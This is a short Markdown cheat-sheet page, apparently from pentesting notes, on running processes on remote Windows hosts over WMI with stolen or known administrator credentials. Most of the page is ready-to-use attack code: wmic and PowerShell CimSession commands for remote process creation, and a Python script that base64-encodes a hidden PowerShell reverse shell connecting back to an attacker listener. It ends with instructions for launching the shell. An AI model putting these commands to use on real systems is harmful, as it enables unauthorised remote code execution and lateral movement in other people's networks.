---
title: WMI
draft: false
tags:
  - windows
  - active-directory
  - recon
  - info-gathering
  - active
---
 
> [!Requirements]
> To create a process on the remote target via WMI, we need the credentials of a member of the _Administrators_ local group, which can also be a domain user.

- Using wmic:
```powershell
C:\> wmic /node:TARGET_IP /user:USER /password:PASSWORD process call create "COMMAND"
```

- Using Powershell:
```powershell
1. Create a PSCredential Object for storing the username and password
PS C:\> $username = 'jen';
PS C:\> $password = 'Nexus123!';
PS C:\> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

2. Create a Common Information Model and define the remote session
PS C:\> $options = New-CimSessionOption -Protocol DCOM
PS C:\> $session = New-Cimsession -ComputerName TARGET_IP -Credential $credential -SessionOption $Options 
PS C:\> $command = 'COMMAND';

3. Invoking the WMI session:
PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

For command, use a base64 encoded powershell payload like the following:
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("LOCAL_IP",LOCAL_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

> [!Note]
> Replace the LOCAL_IP and PORT with the listener on our kali machine.

Run the script:
```bash
python3 encode.py
```

Paste the full command on the $command, setup a listener and start the WMI session
